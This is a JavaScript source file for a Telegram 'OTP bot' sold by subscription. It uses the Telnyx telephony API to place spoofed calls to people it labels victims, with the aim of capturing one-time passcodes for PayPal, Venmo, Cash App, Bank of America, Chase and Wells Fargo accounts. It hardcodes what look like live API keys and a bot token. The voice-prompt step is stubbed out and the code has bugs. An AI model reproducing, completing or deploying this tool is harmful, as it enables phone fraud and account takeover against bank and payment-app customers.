// TELNYX STUFF 
const MY_API_KEY = 'KEY018BF55B4D0ED25E9A0861698D906F2F_xecXP42CjUQBicb53Xqadx'
const service_number = '+14342338629'
const WEBHOOK_URL = 'https://ofbtc.onrender.com';
const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
const ENV_TELNYX_CONNECTION_ID = '2305462997117568053'
const alt_control_id = '2305446111344592690'
const al_alt ='2305800116734265211'
const telnyx = require('telnyx')(MY_API_KEY);
const { Telegraf } = require('telegraf'); // importing telegraf.js
var bot = new Telegraf(bot_token)


const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

async function call (customer_number, ctx, service, digit){
   console.log(ctx, 'first yayyyy')
   bot.telegram.sendMessage(ctx.chat.id, 
      `
      CALL STARTING\n 
      VICTIM NUBER - ${customer_number}\n 
      SERIVCE - ${service}\n
      OTP DIGIT - ${digit}
      `, {})

   // Use the Telnyx API to create a new call
   try {
      const { data: call } = await telnyx.calls.create({
         connection_id: alt_control_id,
         to: `+${customer_number}`,
         from: service_number,
         // webhook_url: WEBHOOK_URL
      });      
   } catch (error) {
      console.log("your error is: ", error)
   }


   // call.answered({

   // })
}


//  COMMANDS
bot.on('start', ctx => {
   console.log(ctx.from)
   bot.telegram.sendMessage(
      ctx.chat.id, `
      𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
      ➤ Type: /purchase to subscribe \n 
      👤 USER COMMANDS 👤 \n
      ➤ /redeem - Redeem your key\n
      ➤ /checktime - Check subscription time left\n\n
      📞 CALL COMMANDS 📞 \n 
      ➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
      ➤ /bank - Capture bank OTP\n
      ➤ /boa - Capture boa OTP\n
      ➤ /chase - Capture chase OTP\n
      ➤ /wellsfargo - Capture Wells fargo OTP\n
      ➤ /venmo - Capture venmo OTP\n
      ➤ /paypal - Capture bank OTP\n      
      `, {})
})

bot.help(ctx => ctx.reply(`
   𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
➤ Type: /purchase to subscribe \n 
👤 USER COMMANDS 👤 \n
➤ /redeem - Redeem your key\n
➤ /checktime - Check subscription time left\n\n
📞 CALL COMMANDS 📞 \n 
➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
➤ /bank - Capture bank OTP\n
➤ /boa - Capture boa OTP\n
➤ /chase - Capture chase OTP\n
➤ /wellsfargo - Capture Wells fargo OTP\n
➤ /venmo - Capture venmo OTP\n
➤ /paypal - Capture bank OTP\n
`))

bot.command('call', ctx => {
   const [command, spoof, number, service ]= ctx.message.text.split(' ');
   const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]

   if( !number || !service.includes(service) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
         reply_markup:{
            inline_keyboard: [
               [
                  {
                     text: 'End Call',
                     callback_data: 'end'
                  }               
               ]
            ]
         }
      }).then(() => {})

      call(number, ctx, service, 6)
   }


})

bot.launch();


// webhook urls
app.get('/', (req, res) => {
   console.log('yay?')
   res.json({status: 'ok', code: 200})
});

app.post('/', (req, res) => {
   const digits = req.body;
   console.log(yayyyy)
   res.json({status: 'ok', code: 200})
});

app.post('/call', (req, res) => {
   const digits = req.body.Digits;
   res.json(req.body)
});

app.post('/webhooks/answered', (req, res) => {
   // Get the call_control_id from the webhook data
   const data = req.body.data;
   console.log(`expected webhook : ${data}`)

   // const call_control_id = data.payload.call_control_id;
   
   // call.gather_using_speak(
   // { 
   //    call_control_id: call_control_id,
   //    payload: 'Say this on the call', 
   //    language: 'en-US', 
   //    voice: 'female' 
   // });

})

app.post('/gather', (req, res) => {
   const digits = req.body.Digits;
   res.json(req.body)
});
 

app.listen(port, () => {
   console.log(`Server running on port ${port}`);
});
 

